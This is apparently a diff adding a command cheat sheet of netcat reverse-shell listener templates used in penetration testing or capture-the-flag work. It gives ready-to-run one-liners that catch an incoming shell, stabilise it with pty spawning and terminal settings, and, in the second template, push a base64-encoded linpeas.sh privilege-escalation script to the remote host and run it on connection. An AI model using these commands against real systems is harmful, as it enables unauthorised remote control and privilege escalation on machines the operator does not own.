@@ -1,0 +1,14 @@
+% Listeners
+
+$ port: echo '9001 443 1234 4444 32000' | tr ' ' '\n'
+$ shell: echo '/bin/bash /bin/zsh /bin/ash /bin/dash /bin/ksh /bin/sh bash zsh ash dash ksh sh' | tr ' ' '\n'
+$ term: echo 'screen xterm xterm-256color' | tr ' ' '\n'
+
+
+# stabilised shell
+$stabiliser: echo 'script -qc "<shell>" /dev/null#python -c "import pty;pty.spawn(\"<shell>\")"#python3 -c "import pty;pty.spawn(\"<shell>\")"' | tr '#' '\n'
+stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp <port> && reset
+
+# linpeas listener
+$ linpeas: locate linpeas.sh | grep PEAS | tail -n 1
+stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear;echo "echo $(cat <linpeas> | base64 -w 0) | base64 -d | bash";cat) | nc -lvnp <port> && reset
